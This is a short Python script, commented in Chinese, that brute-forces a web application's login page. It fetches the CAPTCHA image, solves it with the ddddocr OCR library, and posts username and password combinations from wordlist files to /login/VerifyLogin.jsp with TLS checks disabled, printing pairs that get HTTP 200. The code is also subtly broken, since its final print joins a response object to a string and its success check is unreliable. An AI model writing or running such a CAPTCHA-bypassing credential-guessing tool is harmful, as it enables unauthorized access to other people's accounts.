import ddddocr
import time
begin=time.time()
ocr = ddddocr.DdddOcr()

#获取验证码
# 导入模块
import requests
# 验证码路径
urls = 'http://xx.xx.xx/.MakeValidateCode'
# 定义自定义请求头
headers = {
    "Host": "xx.xx.xx",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "User-Agent":"",
    "Accept":"",
    "Cookie":""
}






with open('zz.txt', encoding = "utf-8") as f:
    for user in f:
        user= user.rstrip()
        with open('pass100.txt', encoding="utf-8") as m:
            for password in m:
                password = password.rstrip()
                response = requests.get(urls, headers=headers)
                img_data = response.content



                res = ocr.classification(img_data)
                time.sleep(0.02)
                data = {

                    "loginid": user,
                    "userpassword": password,
                    "validatecode": res,
                    "tokenAuthKey": ""
                }
                url = 'http://xx.xx.xx/login/VerifyLogin.jsp'
                headers["Referer"] = "http://xx.xx.xx/login/"
                headers["Content-Type"] = "application/x-www-form-urlencoded"

                resp = requests.post(url=url, data=data, headers=headers, verify=False)
                if resp.status_code == 200:
                    print(user + ":" + password+resp)

















